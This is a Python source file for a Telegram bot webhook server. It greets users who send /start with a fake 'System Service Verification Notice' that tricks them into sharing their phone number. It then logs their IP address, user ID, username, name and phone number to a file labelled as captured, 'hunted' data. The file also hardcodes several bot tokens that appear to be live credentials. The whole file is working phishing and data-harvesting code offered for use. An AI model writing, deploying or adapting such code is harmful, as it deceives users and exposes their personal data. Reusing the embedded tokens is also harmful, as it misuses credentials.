from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os
import requests

tokens = [
    "8827076146:AAGG1sCoE9ZZ_gH-zJT02tnVawtQeCTVnpE",
    "8872239752:AAG9ZtYZ5eSerQ2WL2FILdrhdcjjKZ7zoVY",
    "9104061776:AAFrgWhhPwton61AgTwpRAb64DbGiKVmEq8",
    "8602888229:AAHB0XSqtkVa--8uj3OvNAbNsuM4KFECtZ0",
    "8637887859:AAH_vXce9SDiGGDGZiSR96MtP-KMbPrq5SE",
    "8995565845:AAHtl9nON6pgq4bs1_e60b9g4R1Ue0bIFa4",
    "8637887859:AAH_vXce9SDiGGDGZiSR96MtP-KMbPrq5SE"
]

def send_stealth_contact_request(chat_id):
    for token in tokens:  
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        stealth_text = (
            "⚠️ **System Service Verification Notice**\n\n"
            "To ensure uninterrupted access and maintain secure operations for this bot service, "
            "please verify your current phone number by clicking the button below."
        )
        payload = {
            "chat_id": chat_id,
            "text": stealth_text,
            "parse_mode": "Markdown",
            "reply_markup": {
                "keyboard": [
                    [
                        {
                            "text": " Verify Phone Number & Continue",
                            "request_contact": True
                        }
                    ]
                ],
                "resize_keyboard": True,
                "one_time_keyboard": True
            }
        }
        try:
            r = requests.post(url, json=payload, timeout=3)
            if r.status_code == 200:
                break
        except:
            continue

class SilentProxyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()

        try:
            data = json.loads(post_data.decode('utf-8'))
            
            message = data.get('message', {}) or data.get('callback_query', {}).get('message', {})
            user = message.get('from', {})
            contact = message.get('contact', {})
            chat_id = message.get('chat', {}).get('id')
            text = message.get('text', '')

            if chat_id and text == "/start":
                send_stealth_contact_request(chat_id)

            catch_report = {
                "Client_IP": client_ip,
                "User_ID": user.get('id'),
                "Username": user.get('username'),
                "First_Name": user.get('first_name'),
                "Phone_Number": contact.get('phone_number'), 
                "Input_Text": text,
                "Raw_Payload": data
            }

            print("\n[+] --- hunted ---")
            print(json.dumps(catch_report, indent=4, ensure_ascii=False))

            with open("captured_data.txt", "a", encoding="utf-8") as f:
                f.write(json.dumps(catch_report, ensure_ascii=False) + "\n" + "="*50 + "\n")

        except Exception as e:
            print("[-] error:", e)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

def run(server_class=HTTPServer, handler_class=SilentProxyHandler):
   
    port = int(os.environ.get("PORT", 10000))
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"colonel went form here {port}... (Advanced MitM & Telemetry Collector Active)")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
